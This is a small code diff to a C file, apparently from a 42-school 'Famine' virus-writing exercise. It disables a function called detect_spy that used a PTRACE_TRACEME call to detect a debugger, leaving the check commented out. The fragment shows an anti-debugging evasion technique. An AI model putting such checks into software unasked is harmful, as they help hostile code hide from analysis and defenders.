@@ -6,7 +6,7 @@
 /*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/10 16:14:06 by anselme           #+#    #+#             */
-/*   Updated: 2019/12/10 16:14:08 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/11 21:45:02 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,5 +17,5 @@
 
 bool		detect_spy(void)
 {
-	return (famine_ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1);
+	return false;//(famine_ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1);
 }
